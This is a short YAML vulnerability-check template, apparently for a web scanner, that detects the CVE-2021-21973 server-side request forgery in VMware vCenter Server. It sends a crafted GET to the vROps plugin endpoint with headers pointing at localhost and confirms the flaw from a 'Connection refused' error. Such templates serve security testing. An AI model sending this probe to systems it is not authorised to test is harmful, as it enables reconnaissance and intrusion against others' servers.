name: yaml-poc-vmware-vcenter_server-logical-CVE-2021-21973
binding: d871174f-0502-4078-a5e9-f154c7b86dd4
detail:
    author: jiapeng.han
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-21973
        - https://vigilance.fr/vulnerability/VMware-ESXi-vCenter-Server-multiple-vulnerabilities-34663
        - https://www.auscert.org.au/bulletins/ESB-2021.0677
        - https://www.auscert.org.au/bulletins/ESB-2021.1201
        - https://www.ibm.com/support/pages/node/6485985
        - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
    vulnerability:
        id: 18a6ab8c-3305-4a96-a4a7-6d9e8b189caa
        level: medium
    warning: Harmless
transport: http
set:
    rStr0: randomLowercase(6)
    rStr1: randomLowercase(6)
    rStr2: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ui/vropspluginui/rest/services/getvcdetails
            headers:
                Reqresource: '{{rStr2}}'
                Vcip: localhost:2
                Vcpassword: '{{rStr0}}'
                Vcusername: '{{rStr1}}'
            follow_redirects: false
        expression: response.status == 500 && response.body_string.contains('"cause":"Connection refused (Connection refused)"') && response.content_type.contains("application/json")
expression: r0()
